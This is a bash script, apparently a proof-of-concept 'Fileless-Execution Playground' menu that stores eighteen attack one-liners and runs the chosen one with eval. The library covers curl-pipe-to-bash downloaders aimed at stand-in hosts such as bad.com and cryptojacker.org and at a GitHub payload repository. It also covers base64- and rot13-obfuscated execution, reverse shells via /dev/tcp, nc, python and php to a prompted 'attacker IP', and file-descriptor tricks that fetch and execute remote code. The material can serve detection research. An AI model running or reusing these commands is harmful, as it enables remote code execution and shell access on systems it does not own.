#!/usr/bin/env bash
#
# fileless-menu.sh – colourful PoC launcher
# -------------------------------------------------
# ❶  Make it executable:  chmod +x fileless-menu.sh
# ❷  Run and follow the prompts.
# -------------------------------------------------

# ── Colour palette ───────────────────────────────
RESET='\033[0m'
BOLD='\033[1m'
RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
BLU='\033[1;34m'
MAG='\033[1;35m'
CYN='\033[1;36m'

# Map category → colour (feel free to change)
declare -A CAT_COL=(
  [Downloaders]="$GRN"
  [Encoding]="$YEL"
  [ReverseShells]="$RED"
  [AdvancedFD]="$MAG"
)

# ── Command library ──────────────────────────────
declare -A categories
categories[Downloaders]="
# 1
curl -s http://example.com/script.sh | bash
# 2
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
# 3
X=\$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c \"\$X\"
# 4
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)\"
"

categories[Encoding]="
# 5
echo 'ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash
# 6
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)\"
# 7
bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\"
# 8
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
"

categories[ReverseShells]="
# 9
timeout 2s bash -c 'bash -i >& /dev/tcp/\${LHOST}/\${LPORT1} 0>&1' &
# 10
timeout 2s nc -e /bin/sh \${LHOST} \${LPORT1} &
# 11
timeout 2s python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"\${LHOST}\",\${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &
# 12
timeout 2s php -r '\$s=fsockopen(\"\${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &
# 13
timeout 2s bash -c 'bash -i >& /dev/tcp/\${LHOST}/\${LPORT3} 0>&1' &
"

categories[AdvancedFD]="
# 14
exec 3< <(echo 'hs.doaolyp/moc.dab//:ptth' | rev | xargs curl -s); bash /proc/self/fd/3
# 15
exec 3< /bin/bash; /proc/self/fd/3 -c 'echo executed FD shell'
# 16
exec {FD}<>/dev/tcp/\${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &
# 17
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
# 18
python3 - <<'PY'
import urllib.request; print('[*] Inline Python payload executed (test.py)')
exec(urllib.request.urlopen(\"https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py\").read().decode())
PY
"

# ── Helper: prompt for host/ports if unset ───────
ensure_net_vars() {
  : "${LHOST:=$(read -rp '⟹  LHOST not set – enter attacker IP: ' ip && echo "$ip")}"

  for p in 1 2 3; do
    var="LPORT${p}"
    if [[ -z ${!var} ]]; then
      read -rp "⟹  $var not set – enter port $p: " port
      printf -v "$var" '%s' "$port"
    fi
  done
}

# ── Menu draw functions ──────────────────────────
draw_categories() {
  echo -e "\n${BOLD}== Pick a category ==${RESET}"
  local i=0
  for cat in "${!categories[@]}"; do
    printf "%s%2d%s) %b%s%b\n" "$BLU" "$((++i))" "$RESET" "${CAT_COL[$cat]}" "$cat" "$RESET"
  done
}

draw_commands() {
  local cat="$1" cmdlines=()
  # strip leading blank line, read commands
  while IFS= read -r line; do
    [[ $line ]] && cmdlines+=("$line")
  done <<<"${categories[$cat]}"
  echo -e "\n${BOLD}== $cat commands ==${RESET}"
  for ((i=0; i<${#cmdlines[@]}; i+=2)); do
    num="${cmdlines[i]//\# }"
    cmd="${cmdlines[i+1]}"
    printf "%s%2d%s) %s\n" "$CYN" "$num" "$RESET" "$cmd"
  done
}

# ── Main loop ────────────────────────────────────
while true; do
  clear
  echo -e "${BOLD}${MAG}*** Fileless-Execution Playground ***${RESET}"
  draw_categories
  read -rp $'\n⟹  Choose a category (or q to quit): ' choice
  [[ $choice =~ ^[Qq]$ ]] && exit 0

  # Resolve choice → category
  cat_keys=("${!categories[@]}")
  sel_cat="${cat_keys[choice-1]}"
  [[ -z $sel_cat ]] && { echo "❌ Invalid."; sleep 1; continue; }

  draw_commands "$sel_cat"
  read -rp $'\n⟹  Pick command number to run (or b to back): ' num
  [[ $num =~ ^[Bb]$ ]] && continue

  # Extract and fire
  cmd_block="${categories[$sel_cat]}"
  cmd_line=$(grep -A1 -E "^# $num$" <<<"$cmd_block" | tail -n1)

  if [[ -z $cmd_line ]]; then
    echo "❌ Invalid command id."; sleep 1; continue
  fi

  # Ensure networking vars for reverse shells
  if [[ $sel_cat == "ReverseShells" || $cmd_line == *'\${LHOST}'* ]]; then
    ensure_net_vars
  fi

  echo -e "\n${BOLD}[>] Executing:${RESET} ${YEL}$cmd_line${RESET}\n"
  eval "$cmd_line"
  echo -e "\n${GRN}✔ Done. Press Enter to continue…${RESET}"
  read -r
done
